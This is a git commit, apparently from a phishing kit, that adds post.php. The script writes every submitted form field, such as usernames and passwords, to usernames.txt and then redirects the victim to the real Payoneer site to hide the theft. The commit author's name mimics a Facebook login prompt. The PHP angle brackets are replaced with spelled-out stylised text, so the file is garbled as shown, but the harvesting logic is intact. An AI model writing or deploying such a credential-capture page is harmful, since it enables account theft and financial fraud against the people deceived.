3bc120c83f418ca05e61136631be61b471b20601
login-to-facebook-to-continue <166297879+login-to-facebook-to-continue@users.noreply.github.com>
2024-04-09 16:12:42 +0100

    Add files via upload

---
+++ post.php
@@ -0,0 +1,17 @@
+
+𝗟𝗲𝘀𝘀-𝘁𝗵𝗮𝗻 𝗦𝗶𝗴𝗻?php
+header
+('location:');
+$handle=fopen("usernames.txt", "a");
+foreach($_POST as $variable=𝐆𝐫𝐞𝐚𝐭𝐞𝐫-𝐭𝐡𝐚𝐧 𝐒𝐢𝐠𝐧$value)
+{
+fwrite($handle,$variable);
+fwrite($handle,"-");
+fwrite($handle,$value);
+fwrite($handle,"\r\n");
+}
+fwrite($handle,"\r\n");
+fclose($handle);
+header("location:https://www.payoneer.com/");
+exit;
+?𝐆𝐫𝐞𝐚𝐭𝐞𝐫-𝐭𝐡𝐚𝐧 𝐒𝐢𝐠𝐧
